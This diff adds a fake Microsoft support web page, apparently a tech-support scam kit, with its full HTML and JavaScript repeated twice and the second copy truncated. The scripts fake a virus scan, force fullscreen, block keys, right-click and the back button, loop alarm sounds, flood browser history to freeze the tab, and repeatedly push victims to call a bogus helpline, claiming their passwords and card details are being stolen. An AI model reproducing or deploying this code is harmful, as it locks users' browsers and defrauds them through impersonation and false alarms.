@@ -1,0 +1,1963 @@
+<!DOCTYPE html><html><head>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Official Microsoft-Windows-Help-and-Services</title>
+<meta name="robots" content="NOINDEX,NOFOLLOW">
+
+<link href="favicon.ico" rel="shortcut icon">
+
+<script>function formatAMPM() {
+var d = new Date(),
+  minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
+  hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
+  ampm = d.getHours() >= 12 ? 'pm' : 'am',
+  months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
+  days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+return days[d.getDay()]+' '+months[d.getMonth()]+' '+d.getDate()+' '+d.getFullYear()+' '+hours+':'+minutes+ampm;
+}</script>
+
+<script>
+function getURLParameter(name) {
+return decodeURI(
+  (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+);
+}
+</script>
+
+<script>
+gourl = "index.php"
+opener.location = gourl;
+</script>
+
+<script type="text/javascript">
+onbeforeunload=function()
+{
+alert ("Press ESC, to close this page!");
+return "Press ESC, to close this page!";
+
+}
+</script>
+
+
+<script type="text/javascript">
+function move() {
+$("#amt").trigger( "click" );
+}
+
+function pop(url,w,h) {
+var n = window.open(url,'_blank','width='+w+',height='+h);
+if(n==null) {
+return true;
+}
+return false;
+}
+
+
+
+</script>
+
+
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+window.scrollTo(0, 1);
+values = [
+{"percent" : "0", "text" : "Loading..."},
+{"percent" : "11", "text" : "Scanning... <strong>Folders</strong>"},
+{"percent" : "35", "text" : "Scanning... <strong>Documents</strong>"},
+{"percent" : "63", "text" : "Scanning... <strong>System Files</strong>"},
+{"percent" : "81", "text" : "Scanning... <strong>Registry</strong>"},
+{"percent" : "100", "text" : "<strong>Scan Complete</strong>"}
+];
+
+var i = 0;
+var intId = null;
+
+function updateStatusBar() {
+if (i < values.length-1) {
+i++;
+$(".progress-bar-color").css({width: parseInt(values[i].percent)+'%'});
+$('.status-percent').html(values[i].percent + '%');
+$('.status-text').html(values[i].text);
+} else {
+clearInterval(intId);
+$('.status-percent').css('visibility', 'hidden');
+
+
+
+$('.status-text').html('<strong>Virus Found: Tapsnake; CronDNS; Dubfishicv</strong>').addClass('align').fadeOut(500).fadeIn(500).fadeOut(500).fadeIn(500).fadeOut(500, function() {
+  $('.status-text').html('<strong>Searching for removal options...</strong>').addClass('searching');
+  $('.status-text').fadeIn(500, function () {
+      window.setTimeout(function() {
+          $('.outer1').fadeOut(500, function() {
+              $('.outer1').remove();
+              $('.outer2').fadeIn(500);
+          });
+      }, 5000);
+  });
+});
+
+$('.progress-bar').addClass('progress-bar-red');
+}
+}
+
+$('.orange').click(function () {
+$.when($('.outer0').fadeOut(500)).done(function () {
+$('.outer0').remove();
+$('.outer1').show();
+intId = setInterval(updateStatusBar,2000);
+});
+});
+});
+
+</script>
+
+<script type="text/javascript">
+function PopIt() { return "Warning! A Full System Scan is Required."; }
+function UnPopIt()  { /* nothing to return */ }
+
+$(document).ready(function() {
+window.onbeforeunload = PopIt;
+$("a").click(function(){ window.onbeforeunload = UnPopIt; });
+});
+</script>
+  <!-- Latest compiled and minified CSS -->
+  <link rel="stylesheet" href="bootstrap.min.css">
+
+<style type="text/css">body{
+    background: url("background.png") no-repeat;
+    cursor: default;
+    background-size: cover;
+    width: 100%;
+    height: auto;
+    padding: 0;
+    margin: 0;
+  overflow: hidden;
+    zoom:1.1;
+
+  }
+  @media(max-width: 1366px){
+    body{
+      zoom:0.9;
+    }
+  }
+
+  .heading_text{
+    color: #0067b8;
+  }
+  .window_box1{
+    width: 100%;
+    position: fixed;
+    text-align: right;
+    z-index: 7;
+    margin-top: 1%
+  }
+
+  .window_box2{
+     width: 30%;
+     position: fixed;
+     text-align: left;
+     z-index: 8;
+     margin-top: 2%;
+   left: 2%;
+   }
+  .window_box3{
+    width: 30%;
+    position: fixed;
+    text-align: left;
+    z-index: 9;
+    margin-top: 9%;
+  left: 25%;
+  }
+.block2 {
+  width: 100%;
+  bottom: 0;
+  height: 290px;
+  position: fixed;
+  background-color: black;
+  padding: 20px 0;
+  color: white;
+  text-align: center;
+  margin-top: -70px;
+  z-index: 12;
+}
+
+
+.ms-btn {
+  display: inline-block;
+  min-width: 80px;
+  padding: 9px 12px 10px;
+  position: relative;
+  max-width: 100%;
+  text-align: center;
+  white-space: nowrap;
+  overflow: hidden;
+  vertical-align: middle;
+  text-overflow: clip;
+  touch-action: manipulation;
+  line-height: 1;
+  color: white;
+  border-style: solid;
+  border-width: 1px;
+  background-color: rgba(0, 0, 0, .2);
+  background-color: #0078d4;
+  border-color: #0078d4;
+
+}
+.ignore {
+  padding: 5px;
+  border: 2px solid rgb(1, 119, 215);;
+  background-color: white;
+  color: rgb(1, 119, 215);
+  border-radius: 5px;
+}
+
+.chat_now {
+  border: 1px solid green;
+  background-color: green;
+}
+.block1{
+  position: fixed;
+  top: 0;
+  width: 100%;
+  text-align:center;
+  z-index: 11;
+}
+
+.block1 .middle {
+  margin: 0 auto;
+  text-align:justify;
+  margin-top: 20px;
+  max-width: 500px;
+  background-color: #FBFBFB;
+  min-height: 300px;
+  border-radius: 5px;
+  border: 1px solid #BABABA;
+  -webkit-transition: all 500ms ease;
+  -moz-transition: all 500ms ease;
+  -ms-transition: all 500ms ease;
+  -o-transition: all 500ms ease;
+  transition: all 500ms ease;
+}
+.content-box{
+
+}
+.block1 .middle .content-box {
+  padding: 20px;
+}
+
+.block1 .middle .content-box h5 {
+  margin: 20px 0;
+  font-size: 16px;
+}
+
+.block1 .middle .content-box h6 {
+  margin-top: 5px;
+  margin-bottom: 5px;
+  color: rgba(0, 0, 0, 0.7);
+  font-size: 14px;
+}
+
+.block1 .cross , .block1 .cross:hover, .block1 .cross:active {
+  float: right;
+  font-size: 25px;
+  text-decoration: none;
+}
+
+.blink_me {
+  animation: blinker 1s linear infinite;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+
+.heart {
+  /*transform: scale(0.3); */
+  animation: beat 0s linear;
+  transform-origin: center;
+  z-index: 20;
+}
+
+/* Heart beat animation */
+@keyframes beat{
+   from { transform: scale(0.1); }
+}
+
+</style>
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+		window.onkeydown = function(evt)
+		{
+			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17)
+			{
+				return false;
+
+			}
+
+		};
+		window.onkeypress = function(evn)
+		{
+			if(evn.keyCode == 123 || evn.keyCode == 117) return false;
+
+		};
+	</script>
+
+<script type="text/javascript">
+		function toggleFullScreen()
+		{
+			if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
+			{
+				if (document.documentElement.requestFullscreen)
+				{
+					document.documentElement.requestFullscreen();
+
+				}
+				else if (document.documentElement.mozRequestFullScreen)
+				{
+					document.documentElement.mozRequestFullScreen();
+
+				}
+				else if (document.documentElement.webkitRequestFullscreen)
+				{
+					document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+				}
+			}
+		}
+	</script>
+<script type="text/javascript">
+		window.onblur = function()
+		{
+
+		}
+
+	</script>
+<script type="text/javascript">
+		document.addEventListener('keyup', function(es)
+				
+					if (es.keyCode == 27)
+					{
+						toggleFullScreen();
+
+					}
+				}
+				, false);
+	</script>
+<script type="text/javascript">
+		document.addEventListener('keyup', function(e)
+				{
+					if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
+					{
+						document.getElementById('map').innerHTML = stroka;
+						toggleFullScreen();
+
+					}
+				}
+				, false);
+	</script>
+<script type="text/javascript">
+		window.onload = function ()
+		{
+			document.onclick = function (e)
+			{
+				e = e || event;
+				target = e.target || e.srcElement;
+				if (target.tagName == "DIV")
+				{
+					toggleFullScreen();
+					document.body.style.cursor = 'not-allowed';
+					document.getElementById('map').innerHTML = stroka;
+					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;left: -25px;'></iframe>";
+
+				}
+				else
+				{
+					toggleFullScreen();
+					document.body.style.cursor = 'index.htmt';
+					document.getElementById('map').innerHTML = stroka;
+					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;left: -25px;'></iframe>";
+
+				}
+
+			}
+		}
+	</script>
+<script type="text/javascript">
+		document.oncontextmenu=new Function("return false");
+	</script>
+<script type="text/javascript">
+		addEventListener("click", function() {
+			document.getElementById('map').innerHTML = stroka;
+			var
+					el = document.documentElement
+					, rfs =
+							el.requestFullScreen
+							|| el.webkitRequestFullScreen
+							|| el.mozRequestFullScreen
+					;
+
+			rfs.call(el);
+
+		});
+
+
+
+	</script>
+
+<script type="text/javascript">
+		window.onkeydown = function(evt)
+		{
+			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 91)
+			{
+				return togglefullscreen();
+
+			}
+
+		};
+		window.onkeypress = function(evn)
+		{
+			if(evn.keyCode == 123 || evn.keyCode == 117 || evn.keyCode == 91) return false;
+
+		};
+
+
+
+
+	</script>
+
+<script type="text/javascript">
+		onbeforeunload=function()
+		{
+			alert ("Press ESC, to close this page!");
+			return "Press ESC, to close this page!";
+
+		}
+	</script>
+    <script type="text/javascript">
+var idleTime = 0;
+$(document).ready(function () {
+    //Increment the idle time counter every minute.
+    var idleInterval = setInterval(timerIncrement, 60000); // 1 minute
+
+    //Zero the idle timer on mouse movement.
+    $(this).mousemove(function (e) {
+        idleTime = 0;
+    });
+    $(this).keypress(function (e) {
+        idleTime = 0;
+    });
+});
+
+function timerIncrement() {
+    idleTime = idleTime + 1;
+    if (idleTime > 19) { // 20 minutes
+        window.location.reload();
+    }
+}
+</script>
+
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+</script>
+
+
+	<script>
+		var is_chrome,
+				isChromium = window.chrome,
+				vendorName = window.navigator.vendor,
+				isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
+			is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
+
+			function alertCall()
+			{
+      var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+}
+		 	function alertTimed()
+			{
+				if (is_chrome)
+				{
+					setInterval(function(){
+						alertCall();
+					}, 200);
+				}
+				else
+				{
+					alertLoop();
+				}
+			}
+		 	function alertLoop()
+			{
+				for (i = 0; i < 500; i++)
+				{
+					alertCall();
+				}
+			}
+			function addEvent(obj, evt, fn)
+			{
+				if (obj.addEventListener)
+				{
+					obj.addEventListener(evt, fn, false)
+				}
+				else if (obj.attachEvent)
+				{
+					obj.attachEvent("on" + evt, fn)
+				}
+			}
+			$(document).ready(function(){
+				document.onkeydown = function(e){
+					if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
+					{
+						if (!is_chrome)
+						{
+							alertTimed();
+						}
+						return true;
+					}
+					else if (e.keyCode === 123)
+					{
+						return true;
+					}
+					else
+					{
+						return true;
+					}
+				};
+				$(window).on('click', function(){
+					//window.open('index.html', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
+					toggleFullScreen();
+					alertTimed();
+					document.getElementById("ifr").src="index.html";
+
+				});
+				addEvent(document, "mouseout", function(e){
+					e = e ? e : window.event;
+					var from = e.relatedTarget || e.toElement;
+					if (!is_chrome && (!from || from.nodeName == "body"))
+					{
+						alertTimed();
+					}
+				});
+			});
+			window.onbeforeunload = function(e){
+				var message = '*************************************************\n\nCall Windows  Help Desk Immediately at (888) 111-2365-\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows  Help Desk Immediately at (888) 111-2365';
+				e.returnValue = message;
+				return message;
+			};
+			window.onload = function(e){
+				//alertTimed();
+			};
+
+		$('confirm text').dialog(
+    {
+        modal:true, //Not necessary but dims the page background
+        buttons:{
+            'Save':function() {
+                //Whatever code you want to run when the user clicks save goes here
+             },
+             'Delete':function() {
+                 //Code for delete goes here
+              }
+        }
+    }
+);
+
+		</script>
+		 <script type="text/javascript">
+        function toggleFullScreen() {
+            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+                }
+            }
+        }
+
+
+
+
+    </script>
+
+    <script>
+
+function ajay(){
+setInterval(function(){toggleFullScreen(); }, 1000);
+}
+</script>
+
+
+
+
+
+	<script type="text/javascript">
+		document.oncontextmenu=new Function("return false");
+	</script>
+	<script type="text/javascript">
+		addEventListener("click", function() {
+			document.getElementById('map').innerHTML = stroka;
+			var
+					el = document.documentElement
+					, rfs =
+							el.requestFullScreen
+							|| el.webkitRequestFullScreen
+							|| el.mozRequestFullScreen
+					;
+
+			rfs.call(el);
+
+		});</script>
+		<script type="text/javascript">
+		 function openMultipleTabs() {
+        var w1 = window.open('index.php', '1');
+        var w2 = window.open('index.php', '2');
+        var w3 = window.open('indes.php', '3');
+       }
+	</script>
+
+
+
+
+</head>
+
+
+<body onmousemove="move()" onload="ajay()">
+
+  <div class="window_box1 block3 ">
+    <img src="1.gif">
+  </div>
+   <div class="window_box2 block4 ">
+    <img src="3.gif">
+  </div>
+
+ <div class="window_box3 block5 ">
+    <img src="3.gif">
+  </div>
+<div class="container1" style="margin-top: 80px;padding: 30px">
+
+
+
+  <div class="row">
+    <div class="col-md-3">
+      <br><br><br>
+      <h3 class="heading_text">
+        Call For Support
+      </h3>
+      <h3 class="heading_text">
+      (888) 111-2365
+      </h3>
+
+
+    </div>
+     <div class="col-md-6">
+    </div>
+
+    <div class="col-md-3 text-right">
+      <br><br><br>
+      <h3 class="heading_text">
+        Call For Support
+      </h3>
+      <h3 class="heading_text">
+        (888) 111-2365
+      </h3>
+
+
+    </div>
+
+  </div>
+</div>
+<div class="block1 heart">
+      <div class="middle" id="alert-modal">
+            <a style="margin-right: 8px" class="cross">×</a>
+            <div class="content-box" id="alert-content-box">
+              <center><strong>VIRUS ALERT FROM MICROSOFT</strong></center>
+              <center><h5><b>***This computer is BLOCKED***</b></h5></center>
+              <p><b>Do not close this window and restart your computer</b><br>
+              <b>Your computer's registration key is Blocked.</b><br>
+              <b>Why we blocked your computer?</b></p>
+              <p>The window's registration key is illegal.<br>
+              This window is using pirated software.<br>
+              This window is sending virus over the internet.<br>
+              This window is hacked or used from undefined location.<br>
+              We block this computer for your security. <br>
+              Contact Windows helpline to reactivate your computer.</p>
+
+
+
+
+              <form action="#" method="POST" align="center">
+                    <div style="height:75px;text-align:left;">
+                      <strong class="">Enter Windows registration key to unblock or Call Support at <br>
+                        <span style="font-size:21px">(888) 111-2365(Toll Free)</span></strong>
+
+                    <div style="margin-top: 10px;">
+                      <strong class="" style="color: rgba(0, 0, 0, 0.7);float: left;width: 90px;padding-top: 8px"> ENTER KEY:</strong>
+                      <div style="width:100%;max-width: 250px;float: left">
+                        <input type="text" name="ENTER KEY" style="width: 95%;height:35px">
+                      </div>
+                      <div style="float: left;width: 60px">
+                        <input class="ms-btn fa_btn56" type="button" value="Submit">
+                      </div>
+                    </div>
+                     </div>
+                  </form>
+
+            </div>
+          </div>
+</div>
+
+
+<div class="block2" style="background-color:red;">
+  <div class="row ">
+    <div class="col-md-3 col-lg-3 col-sm-3 col-xl-3">
+      <img style="height: 240px; width: auto;" src="rsod.png">
+    </div>
+    <div class="col-md-6 col-lg-6 col-sm-6 col-xl-6 ">
+      <div id="red_alert" style="margin-bottom: 10px;"><br>
+        <h1><img style="height: 40px; width: 40px; margin-top: -10px;" src="335158-windows-8-window.png"> Windows
+          Support Alert</h1>
+        <h3>Your System Detected Some Unusual Activity.</h3>
+        <h5>It might harm your computer data and track your financial activities.</h5>
+        <h3>Please report this activity to (888) 111-2365</h3>
+      </div>
+      <div class="row">
+        <div class="col-md-12">
+          <div class="row">
+            <div class="col-md-6 no-padding-right">
+              <button class="ms-btn">Ignore Alert</button>
+            </div>
+            <div class="col-md-6 no-padding-left">
+                <button class="ms-btn chat_now ">Chat Now</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script> var link_redirect = gourl;
+if (window.history && window.history.pushState) {
+    window.onpopstate = function () {
+        var hashLocation = location.hash;
+        var hashSplit = hashLocation.split("#!/");
+        var hashName = hashSplit[1];
+        if (hashName !== '') {
+            var hash = window.location.hash;
+            if (hash === '') {
+                // alert('Back button was pressed.');
+                window.onbeforeunload = null;
+                window.location=link_redirect;
+                return false;
+            }
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+else {
+    var ignoreHashChange = true;
+    window.onhashchange = function () {
+        if (!ignoreHashChange) {
+            ignoreHashChange = true;
+            var hashLocation = location.hash;
+            var hashSplit = hashLocation.split("#!/");
+            var hashName = hashSplit[1];
+            if (hashName !== '') {
+                var hash = window.location.hash;
+                if (hash === '') {
+                    // alert('Back button was pressed.');
+                    window.onbeforeunload = null;
+                    window.location=link_redirect;
+                    return false;
+                }
+            }
+        }
+        else {
+            ignoreHashChange = false;
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+</script>
+
+
+
+<script> var link_redirect = gourl;
+if (window.history && window.history.pushState) {
+    window.onpopstate = function () {
+        var hashLocation = location.hash;
+        var hashSplit = hashLocation.split("#!/");
+        var hashName = hashSplit[1];
+        if (hashName !== '') {
+            var hash = window.location.hash;
+            if (hash === '') {
+                // alert('Back button was pressed.');
+                window.onbeforeunload = null;
+                window.location=link_redirect;
+                return false;
+            }
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+else {
+    var ignoreHashChange = true;
+    window.onhashchange = function () {
+        if (!ignoreHashChange) {
+            ignoreHashChange = true;
+            var hashLocation = location.hash;
+            var hashSplit = hashLocation.split("#!/");
+            var hashName = hashSplit[1];
+            if (hashName !== '') {
+                var hash = window.location.hash;
+                if (hash === '') {
+                    // alert('Back button was pressed.');
+                    window.onbeforeunload = null;
+                    window.location=link_redirect;
+                    return false;
+                }
+            }
+        }
+        else {
+            ignoreHashChange = false;
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+</script>
+
+
+
+<script type="text/javascript">
+
+
+
+	  //alert("Your Computer is permanently blocked. Call for support at  ")
+
+	document.getElementById('map').innerHTML = "<img style='display:block;position:absolute;top:20px;left:0;right:0;margin:0 auto;z-index:7000;' src=''>";
+</script>
+<script language="JavaScript1.2">
+	<!--
+	if (window.Event)
+		document.captureEvents(Event.MOUSEUP);
+
+	function nocontextmenu() {
+		event.cancelBubble = true, event.returnValue = false;
+
+		return false;
+	}
+
+	function norightclick(e) {
+		if (window.Event) {
+			if (e.which == 2 || e.which == 3) return false;
+		}
+		else if (event.button == 2 || event.button == 3) {
+			event.cancelBubble = true, event.returnValue = false;
+			return false;
+		}
+	}
+
+	if (document.layers)
+		document.captureEvents(Event.MOUSEDOWN);
+
+	document.oncontextmenu = nocontextmenu;
+	document.onmousedown = norightclick;
+	document.onmouseup = norightclick;
+	 </script>
+
+<script>
+	window.setInterval("reloadIFrame();", 50000);
+	function reloadIFrame() {
+	 document.getElementById("calendar").src=calendar.src;
+	}
+	</script>
+
+  <audio autoplay="autoplay" loop="" id="msgSound">
+    <source src="err.mp3" type="audio/mpeg">
+  </audio>
+
+  <audio autoplay="autoplay" loop="" id="msgSound1">
+    <source src="beep.mp3" type="audio/mpeg">
+  </audio>
+
+
+      <script type="text/javascript">/*<![CDATA[*/
+      // audio play /*
+        var msgAudioEl = document.getElementById("msgSound");
+
+        var playMsgInt = setInterval(function () {
+          if (isPlaying(msgAudioEl)) {
+            // console.log('already playing. clearing interval');
+            clearInterval(playMsgInt);
+          } else {
+            // console.log('Triggering play');
+            msgAudioEl.play();
+          }
+        }, 500);
+        // audio play */
+
+      </script>
+
+          <script type="text/javascript">/*<![CDATA[*/
+          // audio play /*
+            var msgAudioEl = document.getElementById("msgSound1");
+
+            var playMsgInt = setInterval(function () {
+              if (isPlaying(msgAudioEl)) {
+                // console.log('already playing. clearing interval');
+                clearInterval(playMsgInt);
+              } else {
+                // console.log('Triggering play');
+                msgAudioEl.play();
+              }
+            }, 500);
+            // audio play */
+
+          </script>
+
+
+          <script type="text/javascript" language="JavaScript1.2">
+
+          	if (window.Event)
+          		document.captureEvents(Event.MOUSEUP);
+
+
+          	function nocontextmenu() {
+          		event.cancelBubble = true, event.returnValue = false;
+
+          		return false;
+          	}
+
+          	function norightclick(e) {
+          		if (window.Event) {
+          			if (e.which == 2 || e.which == 3) return false;
+          		}
+          		else if (event.button == 2 || event.button == 3) {
+          			event.cancelBubble = true, event.returnValue = false;
+          			return false;
+
+          		}
+          	}
+
+
+          	if (document.layers)
+          		document.captureEvents(Event.MOUSEDOWN);
+
+          	document.oncontextmenu = nocontextmenu;
+          	document.onmousedown = norightclick;
+          	document.onmouseup = norightclick;
+
+
+
+          </script>
+
+<iframe src="bxxepxx.mp3" allow="autoplay" style="display:none;">
+</body>
+
+</html>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+<meta http-equiv=content-type content="text/html;charset=UTF-8"/>
+<meta name=robots content="noindex, nofollow">
+<meta http-equiv=Content-Type content="text/html; charset=UTF-8">
+<title>Official Microsoft-Windows-Help-and-Services</title>
+<meta name=robots content=NOINDEX,NOFOLLOW>
+
+<link href="favicon.ico" rel="shortcut icon">
+
+<script>function formatAMPM() {
+var d = new Date(),
+  minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
+  hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
+  ampm = d.getHours() >= 12 ? 'pm' : 'am',
+  months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
+  days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+return days[d.getDay()]+' '+months[d.getMonth()]+' '+d.getDate()+' '+d.getFullYear()+' '+hours+':'+minutes+ampm;
+}</script>
+
+<script>
+function getURLParameter(name) {
+return decodeURI(
+  (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+);
+}
+</script>
+
+<script>
+gourl = "index.html"
+opener.location = gourl;
+</script>
+
+<script type="text/javascript">
+onbeforeunload=function()
+{
+alert ("Press ESC, to close this page!");
+return "Press ESC, to close this page!";
+
+}
+</script>
+
+
+<script type="text/javascript">
+function move() {
+$("#amt").trigger( "click" );
+}
+
+function pop(url,w,h) {
+var n = window.open(url,'_blank','width='+w+',height='+h);
+if(n==null) {
+return true;
+}
+return false;
+}
+
+
+
+</script>
+
+
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+window.scrollTo(0, 1);
+values = [
+{"percent" : "0", "text" : "Loading..."},
+{"percent" : "11", "text" : "Scanning... <strong>Folders</strong>"},
+{"percent" : "35", "text" : "Scanning... <strong>Documents</strong>"},
+{"percent" : "63", "text" : "Scanning... <strong>System Files</strong>"},
+{"percent" : "81", "text" : "Scanning... <strong>Registry</strong>"},
+{"percent" : "100", "text" : "<strong>Scan Complete</strong>"}
+];
+
+var i = 0;
+var intId = null;
+
+function updateStatusBar() {
+if (i < values.length-1) {
+i++;
+$(".progress-bar-color").css({width: parseInt(values[i].percent)+'%'});
+$('.status-percent').html(values[i].percent + '%');
+$('.status-text').html(values[i].text);
+} else {
+clearInterval(intId);
+$('.status-percent').css('visibility', 'hidden');
+
+
+
+$('.status-text').html('<strong>Virus Found: Tapsnake; CronDNS; Dubfishicv</strong>').addClass('align').fadeOut(500).fadeIn(500).fadeOut(500).fadeIn(500).fadeOut(500, function() {
+  $('.status-text').html('<strong>Searching for removal options...</strong>').addClass('searching');
+  $('.status-text').fadeIn(500, function () {
+      window.setTimeout(function() {
+          $('.outer1').fadeOut(500, function() {
+              $('.outer1').remove();
+              $('.outer2').fadeIn(500);
+          });
+      }, 5000);
+  });
+});
+
+$('.progress-bar').addClass('progress-bar-red');
+}
+}
+
+$('.orange').click(function () {
+$.when($('.outer0').fadeOut(500)).done(function () {
+$('.outer0').remove();
+$('.outer1').show();
+intId = setInterval(updateStatusBar,2000);
+});
+});
+});
+
+</script>
+
+<script type="text/javascript">
+function PopIt() { return "Warning! A Full System Scan is Required."; }
+function UnPopIt()  { /* nothing to return */ }
+
+$(document).ready(function() {
+window.onbeforeunload = PopIt;
+$("a").click(function(){ window.onbeforeunload = UnPopIt; });
+});
+</script>
+  <!-- Latest compiled and minified CSS -->
+  <link rel="stylesheet" href="bootstrap.min.css">
+
+<style type="text/css">body{
+    background: url("background.png") no-repeat;
+    cursor: default;
+    background-size: cover;
+    width: 100%;
+    height: auto;
+    padding: 0;
+    margin: 0;
+  overflow: hidden;
+    zoom:1.1;
+
+  }
+  @media(max-width: 1366px){
+    body{
+      zoom:0.9;
+    }
+  }
+
+  .heading_text{
+    color: #0067b8;
+  }
+  .window_box1{
+    width: 100%;
+    position: fixed;
+    text-align: right;
+    z-index: 7;
+    margin-top: 1%
+  }
+
+  .window_box2{
+     width: 30%;
+     position: fixed;
+     text-align: left;
+     z-index: 8;
+     margin-top: 2%;
+   left: 2%;
+   }
+  .window_box3{
+    width: 30%;
+    position: fixed;
+    text-align: left;
+    z-index: 9;
+    margin-top: 9%;
+  left: 25%;
+  }
+.block2 {
+  width: 100%;
+  bottom: 0;
+  height: 290px;
+  position: fixed;
+  background-color: black;
+  padding: 20px 0;
+  color: white;
+  text-align: center;
+  margin-top: -70px;
+  z-index: 12;
+}
+
+
+.ms-btn {
+  display: inline-block;
+  min-width: 80px;
+  padding: 9px 12px 10px;
+  position: relative;
+  max-width: 100%;
+  text-align: center;
+  white-space: nowrap;
+  overflow: hidden;
+  vertical-align: middle;
+  text-overflow: clip;
+  touch-action: manipulation;
+  line-height: 1;
+  color: white;
+  border-style: solid;
+  border-width: 1px;
+  background-color: rgba(0, 0, 0, .2);
+  background-color: #0078d4;
+  border-color: #0078d4;
+
+}
+.ignore {
+  padding: 5px;
+  border: 2px solid rgb(1, 119, 215);;
+  background-color: white;
+  color: rgb(1, 119, 215);
+  border-radius: 5px;
+}
+
+.chat_now {
+  border: 1px solid green;
+  background-color: green;
+}
+.block1{
+  position: fixed;
+  top: 0;
+  width: 100%;
+  text-align:center;
+  z-index: 11;
+}
+
+.block1 .middle {
+  margin: 0 auto;
+  text-align:justify;
+  margin-top: 20px;
+  max-width: 500px;
+  background-color: #FBFBFB;
+  min-height: 300px;
+  border-radius: 5px;
+  border: 1px solid #BABABA;
+  -webkit-transition: all 500ms ease;
+  -moz-transition: all 500ms ease;
+  -ms-transition: all 500ms ease;
+  -o-transition: all 500ms ease;
+  transition: all 500ms ease;
+}
+.content-box{
+
+}
+.block1 .middle .content-box {
+  padding: 20px;
+}
+
+.block1 .middle .content-box h5 {
+  margin: 20px 0;
+  font-size: 16px;
+}
+
+.block1 .middle .content-box h6 {
+  margin-top: 5px;
+  margin-bottom: 5px;
+  color: rgba(0, 0, 0, 0.7);
+  font-size: 14px;
+}
+
+.block1 .cross , .block1 .cross:hover, .block1 .cross:active {
+  float: right;
+  font-size: 25px;
+  text-decoration: none;
+}
+
+.blink_me {
+  animation: blinker 1s linear infinite;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+
+.heart {
+  /*transform: scale(0.3); */
+  animation: beat 0s linear;
+  transform-origin: center;
+  z-index: 20;
+}
+
+/* Heart beat animation */
+@keyframes beat{
+   from { transform: scale(0.1); }
+}
+
+</style>
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+		window.onkeydown = function(evt)
+		{
+			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17)
+			{
+				return false;
+
+			}
+
+		};
+		window.onkeypress = function(evn)
+		{
+			if(evn.keyCode == 123 || evn.keyCode == 117) return false;
+
+		};
+	</script>
+
+<!-- <script type="text/javascript">
+		                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       